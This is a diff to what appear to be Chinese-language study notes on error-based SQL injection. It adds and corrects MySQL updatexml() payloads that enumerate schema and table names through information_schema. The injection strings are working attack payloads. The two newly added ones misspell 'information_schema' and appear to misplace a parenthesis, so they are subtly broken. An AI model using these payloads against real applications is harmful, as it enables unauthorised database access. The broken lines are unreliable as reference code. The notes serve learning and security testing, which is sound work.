@@ -377,9 +377,21 @@ sql源码
 
 (2) 所有库名 (注意限制截取字符串的长度)
 
-`1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_name),1,31)),1) and '1' = '1`
+`1' and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31)),1) and '1' = '1`
 
 (3) 查列表名
+
+A. 一行一请求
+
+`1' and updatexml(1,concat(0x7e,substr((select table_name from information_shcema.tables where table_schema = database() limit 0,1),1,31),1),1) and '1' = '1`
+
+B. 分段全拿
+
+`1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_shcema.tables where table_schema = database()),1,31),1),1) and '1' = '1`
+
+
+
+
 
 ## SQL数据库的补充知识
 一 基础字符部分
